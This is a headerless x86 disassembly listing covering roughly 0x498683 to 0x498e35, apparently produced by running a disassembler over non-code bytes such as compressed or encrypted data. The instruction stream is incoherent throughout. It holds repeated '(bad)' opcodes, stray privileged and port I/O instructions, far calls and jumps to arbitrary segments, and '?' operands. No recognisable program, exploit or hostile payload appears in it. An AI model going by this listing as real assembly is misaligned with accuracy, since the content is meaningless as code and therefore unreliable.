  498683:	adc    cl,0x85
  498686:	inc    esp
  498687:	call   0xff38088a
  49868c:	inc    esi
  49868d:	pop    edx
  49868e:	mov    al,0xec
  498690:	dec    eax
  498691:	cdq    
  498692:	and    al,0xbc
  498694:	or     BYTE PTR [edx],ch
  498696:	pop    ebp
  498697:	in     al,0x48
  498699:	sbb    BYTE PTR [ecx-0x2b],ah
  49869c:	mov    dh,0xd1
  49869e:	in     al,0x42
  4986a0:	call   0xc68bb91a
  4986a5:	pop    esp
  4986a6:	pop    edx
  4986a7:	inc    ecx
  4986a8:	rcl    DWORD PTR [edi],0x97
  4986ab:	xchg   esp,eax
  4986ac:	lods   eax,DWORD PTR ds:[esi]
  4986ad:	sahf   
  4986ae:	mov    esp,0xd8f23889
  4986b3:	adc    BYTE PTR [edx],dh
  4986b5:	fsubp  st(6),st
  4986b7:	adc    eax,0x81def7f1
  4986bc:	out    0xfe,al
  4986be:	jle    0x4986e8
  4986c0:	inc    esp
  4986c1:	imul   ebp,DWORD PTR [ebp-0x18],0xffffffb5
  4986c5:	push   ss
  4986c6:	frstor [ebx]
  4986c8:	push   cs
  4986c9:	jmp    0x498736
  4986cb:	loopne 0x4986e2
  4986cd:	call   0x35bfd53c
  4986d2:	je     0x4986c5
  4986d4:	addr16 loopne 0x498661
  4986d7:	fsub   DWORD PTR [eax-0x73]
  4986da:	pop    edx
  4986db:	add    al,0x1e
  4986dd:	ja     0x4986e3
  4986df:	add    DWORD PTR [edi+0x20],ecx
  4986e2:	mov    ah,0x40
  4986e4:	mov    ch,0xe3
  4986e6:	mov    eax,0x5543f816
  4986eb:	push   cs
  4986ec:	in     al,0x8d
  4986ee:	jne    0x4986d0
  4986f0:	fbld   TBYTE PTR [ebp+0x5384c7ee]
  4986f6:	adc    BYTE PTR [esi],dl
  4986f8:	sti    
  4986f9:	into   
  4986fa:	add    bl,dl
  4986fc:	lds    eax,FWORD PTR [ebx+edi*1-0x4a]
  498700:	lock mov ebp,0x8d12fcc1
  498706:	mov    DWORD PTR [ecx+0x9],eax
  498709:	sub    al,0xaf
  49870b:	les    ecx,FWORD PTR [ecx]
  49870d:	mov    ecx,0xc8a87dfe
  498712:	into   
  498713:	or     esi,edi
  498715:	lea    edi,[edx+eax*1]
  498718:	or     al,0x4d
  49871a:	adc    BYTE PTR [ebx],0x6a
  49871d:	mov    ecx,0xc6aecc18
  498722:	sub    ebx,edi
  498724:	je     0x498738
  498726:	push   esp
  498727:	clc    
  498728:	rol    BYTE PTR [edx+0x78],cl
  49872b:	fist   WORD PTR [ebp+0x6f]
  49872e:	mov    ebx,0x4e410144
  498733:	enter  0x148d,0x30
  498737:	sahf   
  498738:	mov    esp,0xd050d63b
  49873d:	jae    0x498764
  49873f:	popa   
  498740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  498741:	and    bh,BYTE PTR gs:[eax+0x106f8293]
  498748:	in     eax,dx
  498749:	retf   0x3fa8
  49874c:	pusha  
  49874d:	jne    0x498709
  49874f:	lahf   
  498750:	or     edi,eax
  498752:	pop    esi
  498753:	xor    DWORD PTR [eax],ebx
  498755:	add    esi,esi
  498757:	add    cl,0x90
  49875a:	into   
  49875b:	or     esi,eax
  49875d:	icebp  
  49875e:	pop    ss
  49875f:	jb     0x498744
  498761:	mov    BYTE PTR [ebx],cl
  498763:	inc    ebx
  498764:	sub    BYTE PTR [ebx],0xe4
  498767:	mov    BYTE PTR [ebp-0x15],0x52
  49876b:	mov    al,0x37
  49876d:	mov    edx,0x2ac24b18
  498772:	stos   DWORD PTR es:[edi],eax
  498773:	(bad)  
  498774:	hlt    
  498775:	data16 xchg BYTE PTR [esi*1-0x147ff183],bh
  49877d:	inc    esp
  49877e:	cmp    BYTE PTR [ebx],0x62
  498781:	or     esi,eax
  498783:	in     al,dx
  498784:	fcomp  QWORD PTR [eax-0x10]
  498787:	add    esi,DWORD PTR [eax]
  498789:	dec    ebx
  49878a:	cmp    esi,DWORD PTR [ebx+esi*2+0x40facf2]
  498791:	inc    ebx
  498792:	out    dx,eax
  498793:	xchg   esi,eax
  498794:	jecxz  0x49880d
  498796:	dec    edx
  498797:	add    dh,bh
  498799:	add    ebp,DWORD PTR [edx]
  49879b:	fadd   DWORD PTR [eax+0x5888bc48]
  4987a1:	add    eax,esi
  4987a3:	adc    DWORD PTR [eax+0x70],edi
  4987a6:	or     DWORD PTR [esi],ebp
  4987a8:	ret    0x778c
  4987ab:	dec    edi
  4987ac:	outs   dx,DWORD PTR ds:[esi]
  4987ad:	mov    DWORD PTR ds:0x575307a,edx
  4987b3:	dec    ebx
  4987b4:	mov    dl,0xf6
  4987b6:	jb     0x4987c4
  4987b8:	adc    eax,0xcd821596
  4987bd:	push   0xffffff9c
  4987bf:	adc    BYTE PTR [edx-0x65699014],bh
  4987c5:	or     eax,0xfee20118
  4987ca:	retf   0xe280
  4987cd:	mov    ds:0xde2a60b,al
  4987d2:	add    dl,0x9c
  4987d5:	push   eax
  4987d6:	mov    dl,0x40
  4987d8:	adc    BYTE PTR ds:0x7aa3b15c,0xf6
  4987df:	ret    
  4987e0:	adc    BYTE PTR [esi-0x6acbf5c0],bh
  4987e6:	test   BYTE PTR [ebx-0x46],0xc8
  4987ea:	add    al,0xe
  4987ec:	add    al,0x8
  4987ee:	add    dl,BYTE PTR [esi+esi*2]
  4987f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4987f2:	test   eax,0xf7200110
  4987f7:	ret    
  4987f8:	call   0x15ee:0xc16fe2c0
  4987ff:	add    cl,BYTE PTR [ebx-0x35974935]
  498805:	push   esi
  498806:	mov    esi,0x2751801f
  49880b:	shl    DWORD PTR [ebx],1
  49880d:	not    BYTE PTR [esi+edx*1]
  498810:	cmp    edx,DWORD PTR [eax+esi*2+0x74cee96c]
  498817:	or     eax,DWORD PTR [eax-0x57e7b6f3]
  49881d:	xor    eax,0x80c0c0f
  498822:	push   0xffffff9e
  498824:	mov    esi,0x66ef7991
  498829:	nop
  49882a:	push   0x74
  49882c:	or     al,0x50
  49882e:	add    bl,dl
  498830:	push   ebp
  498831:	sbb    DWORD PTR [esi+0x6],edi
  498834:	or     eax,esi
  498836:	add    BYTE PTR [esi+ebx*2-0x51],dl
  49883a:	add    al,0xb6
  49883c:	pop    es
  49883d:	xchg   ebp,eax
  49883e:	cmp    cl,BYTE PTR [edx+0x52]
  498841:	ret    
  498842:	sbb    al,dl
  498844:	adc    BYTE PTR [eax],bl
  498846:	mov    eax,0x81973080
  49884b:	add    al,0xc5
  49884d:	mov    edi,0xb0265a22
  498852:	xor    dl,BYTE PTR es:[edx-0x3d]
  498856:	or     al,0x30
  498858:	xchg   edi,eax
  498859:	adc    al,BYTE PTR [edx]
  49885b:	das    
  49885c:	bound  ebp,QWORD PTR [ebx+0x73010854]
  498862:	or     esp,eax
  498864:	loopne 0x498853
  498866:	pusha  
  498867:	test   edx,0x8bc75847
  49886d:	retf   0x45be
  498870:	dec    eax
  498871:	in     eax,0x39
  498873:	mov    eax,0xcf3b1f20
  498878:	xor    bl,cl
  49887a:	into   
  49887b:	pusha  
  49887c:	rol    DWORD PTR [ebx+0x2040c8c2],0x42
  498883:	sub    al,0xcf
  498885:	push   es
  498886:	data16 cld 
  498888:	pop    edi
  498889:	and    edx,ecx
  49888b:	pop    esi
  49888c:	pop    ebx
  49888d:	nop
  49888e:	xor    bl,BYTE PTR [eax+0xf]
  498891:	sbb    al,0x36
  498893:	or     ebp,DWORD PTR [eax-0x3e]
  498896:	or     ch,BYTE PTR [eax+0x37890d0f]
  49889c:	cmp    BYTE PTR [ebx-0x5d],0xd2
  4988a0:	inc    eax
  4988a1:	ret    
  4988a2:	or     eax,0x50e91240
  4988a7:	or     eax,0xb0574c24
  4988ac:	push   ss
  4988ad:	xchg   BYTE PTR [edi],bh
  4988af:	adc    al,0x42
  4988b1:	dec    esp
  4988b2:	rol    BYTE PTR [ebp+0x6a],cl
  4988b5:	adc    BYTE PTR [edx+0x75],bl
  4988b8:	test   eax,0xca769534
  4988bd:	or     BYTE PTR [esi],cl
  4988bf:	or     BYTE PTR [eax+edx*1],al
  4988c2:	add    dh,BYTE PTR [edx]
  4988c4:	mov    eax,0x120a543
  4988c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4988ca:	push   es
  4988cb:	or     edx,0x15425047
  4988d1:	in     al,0xfe
  4988d3:	push   ss
  4988d4:	mov    esi,0xdb08bc25
  4988d9:	mov    ebp,0xfafebfc6
  4988de:	jne    0x498863
  4988e0:	cs (bad) 
  4988e3:	pop    ss
  4988e4:	or     BYTE PTR [edx+edx*1],dh
  4988e7:	or     edx,edi
  4988e9:	loopne 0x4988a5
  4988eb:	test   esi,ecx
  4988ed:	push   eax
  4988ee:	pop    esp
  4988ef:	hlt    
  4988f0:	ins    DWORD PTR es:[edi],dx
  4988f1:	add    DWORD PTR [eax-0x42],ebx
  4988f4:	out    0xde,eax
  4988f6:	mov    eax,ds:0x227e1096
  4988fb:	jne    0x498930
  4988fd:	and    al,0xeb
  4988ff:	mov    eax,ds:0x8bef1f02
  498904:	js     0x4988c9
  498906:	mov    eax,ds:0xd07d4a1f
  49890b:	push   esi
  49890c:	inc    ebx
  49890d:	push   ecx
  49890e:	add    eax,edi
  498910:	ret    0x1e87
  498913:	sar    BYTE PTR [edi+0x500c3acf],1
  498919:	scas   al,BYTE PTR es:[edi]
  49891a:	adc    bh,BYTE PTR [edx]
  49891c:	xor    cl,BYTE PTR [eax+0x7051f45d]
  498922:	and    al,al
  498924:	push   ss
  498925:	add    eax,0x90e2d9f8
  49892a:	clc    
  49892b:	mov    al,0x20
  49892d:	inc    ebp
  49892e:	push   edx
  49892f:	mov    ?,eax
  498931:	test   BYTE PTR [eax+ebp*1+0x6],dh
  498935:	test   DWORD PTR [esp+ecx*2+0x160c1b7b],0xee08ae40
  498940:	adc    DWORD PTR [edx],ecx
  498942:	or     DWORD PTR [edx],0x2a
  498945:	mov    ecx,DWORD PTR [ebx+ebp*1+0x78]
  498949:	test   BYTE PTR [eax],bl
  49894b:	xchg   eax,ebx
  49894d:	push   es
  49894e:	add    al,0x94
  498950:	mov    dh,0x2
  498952:	inc    esi
  498953:	daa    
  498954:	adc    dl,BYTE PTR [esi]
  498956:	adc    ch,BYTE PTR [esi+ebp*1+0x7d]
  49895a:	rol    ch,0x46
  49895d:	push   ebx
  49895e:	out    0xe0,eax
  498960:	or     BYTE PTR [eax-0x14],ah
  498963:	fxsave [eax+0x24]
  498967:	jmp    0xf39c83c
  49896c:	inc    esi
  49896d:	fiadd  DWORD PTR [ebx]
  49896f:	mul    DWORD PTR [edx+0x5e]
  498972:	test   eax,0x8ce3699
  498977:	adc    al,BYTE PTR [esp+eax*1]
  49897a:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49897c:	sbb    DWORD PTR [ecx+0x8],ebp
  49897f:	add    dl,BYTE PTR [eax]
  498981:	add    eax,edx
  498983:	mov    cl,0x72
  498985:	jo     0x49890d
  498987:	jbe    0x498957
  498989:	mov    ecx,eax
  49898b:	mov    esp,0xf7bc1e60
  498990:	cld    
  498991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  498992:	retf   
  498993:	je     0x4989bf
  498995:	and    BYTE PTR [eax],dh
  498997:	sbb    al,0xe
  498999:	inc    eax
  49899a:	jg     0x498967
  49899c:	push   ecx
  49899d:	cmp    DWORD PTR [ecx],edi
  49899f:	jns    0x49896f
  4989a1:	into   
  4989a2:	into   
  4989a3:	mov    edi,0xec4c4dde
  4989a8:	or     eax,0x5a64c723
  4989ad:	sub    eax,0xd587fc0
  4989b2:	out    dx,eax
  4989b3:	icebp  
  4989b4:	push   es
  4989b5:	out    dx,eax
  4989b6:	push   ss
  4989b7:	pop    ebx
  4989b8:	nop
  4989b9:	pop    ebx
  4989ba:	sahf   
  4989bb:	pop    ebx
  4989bc:	sub    ebx,DWORD PTR [esi]
  4989be:	adc    al,BYTE PTR [esi]
  4989c0:	mov    al,ds:0x84500a4
  4989c5:	popf   
  4989c6:	clc    
  4989c7:	add    BYTE PTR [eax],al
  4989c9:	mov    WORD PTR [ebx],cs
  4989cb:	rcr    BYTE PTR [edx],1
  4989cd:	pop    es
  4989ce:	ret    0x1b16
  4989d1:	or     BYTE PTR [ebx],ah
  4989d3:	inc    eax
  4989d4:	ja     0x4989d9
  4989d6:	fist   WORD PTR [eax+0x1]
  4989d9:	cmp    DWORD PTR [edi],0xffffff90
  4989dc:	dec    edi
  4989dd:	shr    DWORD PTR [esi],0x59
  4989e0:	call   0x412:0x1e2b068
  4989e7:	test   cl,cl
  4989e9:	lahf   
  4989ea:	pop    edx
  4989eb:	and    ebp,edi
  4989ed:	loop   0x4989c3
  4989ef:	xchg   esp,eax
  4989f0:	out    0x9,al
  4989f2:	adc    al,0x4
  4989f4:	add    al,0x34
  4989f6:	repnz mov WORD PTR [eax+ecx*1],?
  4989fa:	add    dl,BYTE PTR [eax]
  4989fc:	add    DWORD PTR [ebp+0x28],eax
  4989ff:	jbe    0x498a15
  498a01:	imul   eax,DWORD PTR [ebp-0x1be3dc32],0xc3f348cb
  498a0b:	je     0x498a31
  498a0d:	and    BYTE PTR [eax-0x3d],al
  498a10:	jne    0x498a24
  498a12:	pusha  
  498a13:	inc    edi
  498a14:	shl    esp,cl
  498a16:	or     al,BYTE PTR [esi-0x2a]
  498a19:	sub    al,0x83
  498a1b:	jmp    0xb0c1c372
  498a20:	mov    bl,BYTE PTR ds:0x18c02081
  498a26:	mov    ecx,gs
  498a28:	retf   0xd082
  498a2b:	jb     0x498a9f
  498a2d:	retf   0xc1ca
  498a30:	sbb    al,0x6e
  498a32:	mov    al,ds:0x862e335c
  498a37:	out    dx,al
  498a38:	mov    bh,0xe1
  498a3a:	rcl    ch,0xfe
  498a3d:	pop    ebx
  498a3e:	mov    ah,0x1f
  498a40:	push   cs
  498a41:	sbb    al,0xa0
  498a43:	adc    BYTE PTR [esi],bh
  498a45:	ret    0x13b8
  498a48:	(bad)  
  498a49:	aam    0x8b
  498a4b:	(bad)  
  498a4d:	xchg   BYTE PTR [edi],bh
  498a4f:	mov    ecx,edi
  498a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  498a52:	push   esi
  498a53:	jp     0x498aad
  498a55:	add    DWORD PTR [eax],ecx
  498a57:	or     ecx,0x10
  498a5a:	stos   BYTE PTR es:[edi],al
  498a5b:	xchg   esp,eax
  498a5c:	hlt    
  498a5d:	call   0xb34a828e
  498a62:	stos   DWORD PTR es:[edi],eax
  498a63:	sar    BYTE PTR [ecx],1
  498a65:	sbb    BYTE PTR [esi-0x353174d6],ch
  498a6b:	inc    ebp
  498a6c:	xchg   esi,eax
  498a6d:	and    BYTE PTR [esi+0x3e89f0ec],ah
  498a73:	xchg   esp,eax
  498a74:	inc    ebp
  498a75:	rcr    dh,0x68
  498a78:	data16 (bad) 
  498a7a:	rol    DWORD PTR [edx-0x13],1
  498a7d:	inc    esi
  498a7e:	jl     0x498a9b
  498a80:	lea    ebp,ds:0x7d73f4a4
  498a86:	sbb    al,0x4a
  498a88:	mov    eax,DWORD PTR [ebx]
  498a8a:	and    BYTE PTR [ebx-0x353effbd],dh
  498a90:	je     0x498a97
  498a92:	jnp    0x498a98
  498a94:	loopne 0x498a4a
  498a96:	or     bh,BYTE PTR [ebx]
  498a98:	(bad)  
  498a99:	cs wbinvd 
  498a9c:	cmp    al,0x21
  498a9e:	add    BYTE PTR [ebp+0x34],bl
  498aa1:	repz jle 0x498a36
  498aa4:	ret    0x953
  498aa7:	jl     0x498ac4
  498aa9:	imul   eax,eax,0x1b48290
  498aaf:	aaa    
  498ab0:	or     DWORD PTR [edx-0x1f],edx
  498ab3:	jmp    0xb7a0:0x9374553a
  498aba:	and    DWORD PTR [ebx-0x175fd2b8],0x2
  498ac1:	jb     0x498aa4
  498ac3:	sbb    al,ch
  498ac5:	sbb    ah,dl
  498ac7:	mov    bh,0x3c
  498ac9:	out    dx,al
  498aca:	je     0x498aa4
  498acc:	mov    dl,BYTE PTR [eax+0x38]
  498acf:	sar    DWORD PTR [ebx],1
  498ad1:	inc    ebp
  498ad2:	loope  0x498afe
  498ad4:	xchg   esi,eax
  498ad5:	mov    cl,BYTE PTR [ecx]
  498ad7:	cmp    ah,dh
  498ad9:	cmp    cl,dl
  498adb:	lock adc DWORD PTR [esp+eax*8],esp
  498adf:	jbe    0x498a8b
  498ae1:	dec    eax
  498ae2:	int3   
  498ae3:	in     al,0xeb
  498ae5:	mov    edx,0x77c83233
  498aea:	push   0x9ca56134
  498aef:	xchg   ebp,eax
  498af0:	test   al,0x41
  498af2:	cwde   
  498af3:	dec    ebx
  498af4:	loopne 0x498afe
  498af6:	cwde   
  498af7:	ror    BYTE PTR [ebx+0x6c],0xa
  498afb:	fisubr DWORD PTR [ecx-0x80]
  498afe:	inc    ecx
  498aff:	cmp    DWORD PTR [ecx],ecx
  498b01:	imul   esp,eax,0x12
  498b04:	adc    DWORD PTR [edi+edx*4-0x50],esi
  498b08:	push   es
  498b09:	aaa    
  498b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  498b0b:	fsubr  QWORD PTR [edx+0x9]
  498b0e:	or     ch,cl
  498b10:	popa   
  498b11:	mov    esi,DWORD PTR [edi-0x60]
  498b14:	aam    0xc2
  498b16:	sbb    BYTE PTR [edi+edi*4-0x1d],bl
  498b1a:	jle    0x498b5c
  498b1c:	adc    al,al
  498b1e:	jns    0x498b6c
  498b20:	add    esi,ebx
  498b22:	add    eax,0xca94849
  498b27:	sbb    ecx,DWORD PTR [edx+0x74]
  498b2a:	push   ebx
  498b2b:	dec    eax
  498b2c:	inc    ecx
  498b2d:	test   ebx,ebp
  498b2f:	add    bh,BYTE PTR [eax+0x5]
  498b32:	mov    ah,0xa8
  498b34:	ret    
  498b35:	mov    eax,ds:0x410121e4
  498b3a:	pop    edx
  498b3b:	pop    es
  498b3c:	fadd   st(1),st
  498b3e:	dec    edi
  498b3f:	push   0xcd12ab70
  498b44:	loopne 0x498b5d
  498b46:	call   0x6478:0xd81ad0a2
  498b4d:	call   FWORD PTR [eax]
  498b4f:	ret    0xe422
  498b52:	xor    esp,DWORD PTR [eax]
  498b54:	ins    BYTE PTR es:[edi],dx
  498b55:	sti    
  498b56:	loop   0x498b23
  498b58:	and    dh,BYTE PTR [ecx]
  498b5a:	push   ebx
  498b5b:	push   edi
  498b5c:	mov    bh,0xe9
  498b5e:	pusha  
  498b5f:	loope  0x498b01
  498b61:	adc    eax,edx
  498b63:	and    eax,0x8e411bd4
  498b68:	sub    DWORD PTR [ebx+eiz*2+0x1c],edi
  498b6c:	and    ah,al
  498b6e:	fmul   DWORD PTR [eax+0x33]
  498b71:	daa    
  498b72:	and    ah,0xf
  498b75:	fmul   st,st(0)
  498b77:	xor    al,0xa3
  498b79:	mov    eax,ds:0x2020e000
  498b7e:	xor    BYTE PTR [edi],ah
  498b80:	es loop 0x498bc0
  498b83:	inc    eax
  498b84:	xchg   ecx,eax
  498b85:	inc    edx
  498b86:	pusha  
  498b87:	jne    0x498b8b
  498b89:	adc    ebp,DWORD PTR [ecx-0x38]
  498b8c:	sub    DWORD PTR [ecx+0x2e],edi
  498b8f:	push   ebp
  498b90:	rol    DWORD PTR [eax+ebp*1+0x29],cl
  498b94:	mov    ecx,0x284410e4
  498b99:	(bad)  
  498b9a:	pusha  
  498b9b:	test   eax,0x1d4ba105
  498ba0:	adc    BYTE PTR [eax],cl
  498ba2:	add    DWORD PTR [ebx-0x20],0x6f521ef0
  498ba9:	add    al,0xba
  498bab:	sti    
  498bac:	jae    0x498bcd
  498bae:	xor    BYTE PTR [edi],bh
  498bb0:	push   DWORD PTR [eax+0x8]
  498bb3:	cs sub eax,0x42bb552
  498bb9:	cs jne 0x498c0d
  498bbc:	imul   ebx,DWORD PTR [ebx],0xffffffa3
  498bbf:	adc    DWORD PTR [ebx],ecx
  498bc1:	or     BYTE PTR [ecx-0x10ef897f],al
  498bc7:	adc    esi,DWORD PTR [ebp-0x15]
  498bca:	and    DWORD PTR [edi+0x50],edx
  498bcd:	xlat   BYTE PTR ds:[ebx]
  498bce:	loope  0x498bd0
  498bd0:	xlat   BYTE PTR ds:[ebx]
  498bd1:	out    dx,eax
  498bd2:	xchg   edx,eax
  498bd3:	ret    0x8a06
  498bd6:	add    al,0x7
  498bd8:	cmp    al,0x3d
  498bda:	add    BYTE PTR [esi+0x7],dh
  498bdd:	jno    0x498b93
  498bdf:	push   esp
  498be0:	sti    
  498be1:	fst    DWORD PTR [esi-0x227ff7df]
  498be7:	sub    eax,DWORD PTR ds:0xa0f8c161
  498bed:	or     al,al
  498bef:	cmp    ebp,ebp
  498bf1:	dec    edx
  498bf2:	pop    ds
  498bf3:	jmp    0x498be5
  498bf5:	mov    ds:0x3852a2fa,eax
  498bfa:	in     al,0x1a
  498bfc:	iret   
  498bfd:	mov    edx,0xa407394c
  498c02:	int    0x37
  498c04:	leave  
  498c05:	pushf  
  498c06:	rol    DWORD PTR [eax+eax*2],0x83
  498c0a:	cmp    DWORD PTR [esi+0x40],edx
  498c0d:	pop    ecx
  498c0e:	cmp    BYTE PTR [edx-0x5f],0xc3
  498c12:	mov    esi,eax
  498c14:	push   edi
  498c15:	ins    BYTE PTR es:[edi],dx
  498c16:	sub    al,0x3d
  498c18:	add    DWORD PTR [ecx+0x9],edi
  498c1b:	sar    BYTE PTR [ebp+0x152d9dc1],1
  498c21:	sub    edi,esi
  498c23:	lahf   
  498c24:	inc    edi
  498c25:	pop    ds
  498c26:	mov    DWORD PTR [esi],eax
  498c28:	loope  0x498c2e
  498c2a:	add    DWORD PTR [eax-0x618ccfce],ebp
  498c30:	or     DWORD PTR es:[ebx-0x36e6f43e],0x64e069ad
  498c3b:	or     dh,BYTE PTR [ebx+0x403410e8]
  498c41:	sub    ebp,ecx
  498c43:	outs   dx,BYTE PTR ds:[esi]
  498c44:	mov    al,ds:0x806b8d2b
  498c49:	push   edi
  498c4a:	ret    0x53fc
  498c4d:	push   0x3d
  498c4f:	add    eax,DWORD PTR [edi]
  498c51:	add    DWORD PTR [edi],edi
  498c53:	push   esp
  498c54:	dec    eax
  498c55:	and    DWORD PTR [eax+0x6],ebx
  498c58:	inc    ecx
  498c59:	aad    0x86
  498c5b:	xor    BYTE PTR [esi],al
  498c5d:	inc    eax
  498c5e:	mov    dh,0x7b
  498c60:	sbb    DWORD PTR [ebx+0x5f703ca4],ecx
  498c66:	add    DWORD PTR [ebx+0x381a1f8],esp
  498c6c:	loope  0x498c74
  498c6e:	cmp    DWORD PTR [ebx],0xa646405
  498c74:	mov    eax,0xc21f7b45
  498c79:	jge    0x498c1e
  498c7b:	and    edi,DWORD PTR [eax+0x39246560]
  498c81:	sbb    eax,0x8ad23b58
  498c86:	cdq    
  498c87:	sbb    al,0x74
  498c89:	dec    edx
  498c8a:	in     eax,0x18
  498c8c:	aad    0x56
  498c8e:	or     edi,ebp
  498c90:	push   eax
  498c91:	clc    
  498c92:	cli    
  498c93:	fist   DWORD PTR [ebx+0x4be0575]
  498c99:	out    0x85,eax
  498c9b:	enter  0x4731,0xf6
  498c9f:	je     0x498c7f
  498ca1:	mov    DWORD PTR [eax],ebx
  498ca3:	jg     0x498d1f
  498ca5:	xor    eax,0x19053e68
  498caa:	int3   
  498cab:	ret    
  498cac:	sti    
  498cad:	push   edx
  498cae:	lock mov ah,0x2b
  498cb1:	loop   0x498cef
  498cb3:	clc    
  498cb4:	and    al,0x6a
  498cb6:	cld    
  498cb7:	pop    eax
  498cb8:	inc    esp
  498cb9:	sub    ebp,DWORD PTR [edi+0x3a4951b6]
  498cbf:	push   edx
  498cc0:	adc    al,0x4e
  498cc2:	lea    esi,[esi+edi*4]
  498cc5:	push   ss
  498cc6:	outs   dx,BYTE PTR ds:[esi]
  498cc7:	outs   dx,BYTE PTR ds:[esi]
  498cc8:	add    BYTE PTR [ecx+0x5acc859],bh
  498cce:	ror    BYTE PTR [ecx-0x5b],0x11
  498cd2:	mov    bh,0x0
  498cd4:	hlt    
  498cd5:	ret    
  498cd6:	js     0x498c80
  498cd8:	inc    esi
  498cd9:	jae    0x498ce5
  498cdb:	sbb    al,0x77
  498cdd:	ss int3 
  498cdf:	(bad)  
  498ce1:	inc    edi
  498ce2:	dec    esi
  498ce3:	mov    eax,0x3fcf905c
  498ce8:	jae    0x498d54
  498cea:	popa   
  498ceb:	je     0x498cbc
  498ced:	fmul   DWORD PTR fs:[ecx+edi*4+0x37b0dfe7]
  498cf5:	push   cs
  498cf6:	(bad)  
  498cf7:	popa   
  498cf8:	push   ebp
  498cf9:	jmp    0x498d49
  498cfb:	dec    edi
  498cfc:	fs mov esp,0x8bc0c13
  498d02:	and    al,0xdf
  498d04:	lea    eax,[edi+0x2]
  498d07:	add    al,0xb3
  498d09:	xlat   BYTE PTR ds:[ebx]
  498d0a:	loope  0x498cea
  498d0c:	ss cmp ax,0x4e6f
  498d11:	sub    ecx,DWORD PTR [eax+edx*2]
  498d14:	js     0x498d8d
  498d16:	pop    edi
  498d17:	sub    DWORD PTR [esi+edx*1],eax
  498d1a:	adc    al,0x12
  498d1c:	cld    
  498d1d:	lea    ecx,[eax+edi*4]
  498d20:	mov    eax,esi
  498d22:	add    BYTE PTR [ecx],bh
  498d24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  498d25:	adc    esi,ebp
  498d27:	mov    ah,0x19
  498d29:	jb     0x498d34
  498d2b:	call   0x6d9156a0
  498d30:	les    eax,FWORD PTR [ebx]
  498d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498d33:	and    BYTE PTR [eax+0x6b9c7f84],ah
  498d39:	pop    ds
  498d3a:	int3   
  498d3b:	adc    eax,0x50def8cf
  498d40:	push   esi
  498d41:	xor    eax,esi
  498d43:	inc    ecx
  498d44:	shr    DWORD PTR [ecx-0x4fadc2a9],cl
  498d4a:	(bad)  
  498d4b:	sub    ebx,DWORD PTR [eax]
  498d4d:	dec    ebx
  498d4e:	scas   eax,DWORD PTR es:[edi]
  498d4f:	xor    bh,BYTE PTR [esp+ebp*8]
  498d52:	mov    BYTE PTR [eax],bl
  498d54:	inc    eax
  498d55:	fsubr  DWORD PTR [esi+eax*1-0x37cb2e4c]
  498d5c:	push   ecx
  498d5d:	dec    esi
  498d5e:	shl    BYTE PTR [ebx],1
  498d60:	sbb    esp,DWORD PTR [esi]
  498d62:	pop    ecx
  498d63:	mov    eax,0x1e06fa83
  498d68:	ret    
  498d69:	push   esp
  498d6a:	int    0x57
  498d6c:	pcmpeqb mm1,QWORD PTR [esi]
  498d6f:	test   BYTE PTR [eax+0x14b32c38],ah
  498d75:	scas   al,BYTE PTR es:[edi]
  498d76:	ss fs xor eax,0x45b2e0f1
  498d7d:	jae    0x498dbe
  498d7f:	mov    DWORD PTR [edi+0x3c5b255d],0x1fa07683
  498d89:	or     BYTE PTR [ebx+0x563ef86b],ch
  498d8f:	push   edi
  498d90:	mov    esp,0x7913420b
  498d95:	imul   ebx,DWORD PTR [edi],0x30
  498d98:	push   esi
  498d99:	test   BYTE PTR [eax],0x28
  498d9c:	adc    BYTE PTR [ebx+0x28],bl
  498d9f:	or     al,0xbf
  498da1:	inc    esi
  498da2:	bound  esi,QWORD PTR [ebp+0x7d8f6990]
  498da8:	sub    al,0x2c
  498daa:	lods   al,BYTE PTR ds:[esi]
  498dab:	mov    ?,WORD PTR [eax+eiz*1+0x10]
  498daf:	jmp    0x5670:0xfa2f740b
  498db6:	mov    esi,0x923c048e
  498dbb:	inc    esi
  498dbc:	cmp    dh,BYTE PTR ds:0x8ac34c5a
  498dc2:	dec    edx
  498dc3:	dec    esp
  498dc4:	hlt    
  498dc5:	or     dh,BYTE PTR [esi+0x17f004d1]
  498dcb:	push   edx
  498dcc:	ficomp WORD PTR ds:0x401a7404
  498dd2:	mov    dl,BYTE PTR [eax]
  498dd4:	hlt    
  498dd5:	fwait
  498dd6:	or     DWORD PTR [eax],ebp
  498dd8:	mov    bh,BYTE PTR [edx]
  498dda:	shl    BYTE PTR [esi],1
  498ddc:	rol    cl,cl
  498dde:	loope  0x498de8
  498de0:	or     ecx,edx
  498de2:	or     DWORD PTR [ebx+0x7566a57d],esp
  498de8:	or     ecx,DWORD PTR [eax-0x15]
  498deb:	sbb    DWORD PTR [ecx+edx*8],esp
  498dee:	jge    0x498e5d
  498df0:	outs   dx,BYTE PTR ds:[esi]
  498df1:	inc    ebx
  498df2:	push   eax
  498df3:	add    dh,BYTE PTR [eax]
  498df5:	or     BYTE PTR [esi+0x62],ah
  498df8:	retf   
  498df9:	fld    QWORD PTR [ebp+0x74]
  498dfc:	fld    QWORD PTR [esi+0x37]
  498dff:	push   cs
  498e00:	lds    edx,FWORD PTR [edi]
  498e02:	jae    0x498e12
  498e04:	mov    DWORD PTR ds:0x6de18908,edx
  498e0a:	dec    edi
  498e0b:	pop    ebx
  498e0c:	out    0x1b,eax
  498e0e:	cmova  esi,DWORD PTR [ecx-0x7d]
  498e12:	aas    
  498e13:	mov    ebx,0x902ed458
  498e18:	pop    ebx
  498e19:	ret    
  498e1a:	in     eax,0x64
  498e1c:	or     al,0x7
  498e1e:	les    esp,FWORD PTR [ebx]
  498e20:	sub    DWORD PTR [edi],eax
  498e22:	adc    al,ah
  498e24:	cmp    dl,BYTE PTR [ebx+0x5a]
  498e27:	adc    eax,esp
  498e29:	dec    esi
  498e2a:	adc    BYTE PTR [edi],bh
  498e2c:	pop    ds
  498e2d:	push   ebx
  498e2e:	(bad)  
  498e2f:	adc    eax,0x74cb0a8a
  498e34:	iret   
  498e35:	stos   DWORD PTR es:[edi],eax
